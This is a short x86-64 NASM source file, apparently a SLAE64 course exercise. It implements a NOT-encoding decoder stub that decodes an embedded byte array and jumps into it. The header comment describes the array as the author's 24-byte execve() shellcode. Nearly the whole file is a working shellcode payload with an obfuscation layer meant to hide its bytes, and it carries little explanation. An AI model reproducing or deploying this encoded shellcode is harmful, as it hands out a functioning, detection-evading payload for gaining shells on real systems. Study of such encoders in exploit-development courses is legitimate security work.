;
; Filename: not-decoder.nasm
; Author: Gitsnik SLAE64-1232
; Website: http://dracyrys.com/
;
; Purpose:
;       Provide two way NOT encoding of shellcode bytes.
;
; This is both the encode and decode program, I have split them separately
; to make the process more obvious. 
;
; This program may be compiled and get-sh.sh used to extract the resulting
; NOT encoded bytes. The sample here contains my 24 byte execve() shellcode
;

bits 64
global _start

section .text

_start:

	jmp short callmain
main:
	xor rcx, rcx
	mul rcx

	pop rsi
	lea rdi, [rsi]

	mov cl, codelen

encode:
	mov bl, byte [rsi + rax]
	not bl
	mov byte [rdi], bl

	inc rdi
	inc rax

	dec rcx
	jnz encode

	jmp short shellcode

callmain:
	call main

	shellcode: db 0x95,0xc4,0xa7,0xb5,0x44,0xd0,0x9d,0x96,0x91,0xd0,0xd0,0x8c,0x97,0x66,0xad,0xac,0xab,0xa0,0xad,0xa8,0xab,0xa1,0xf0,0xfa
	codelen equ $-shellcode
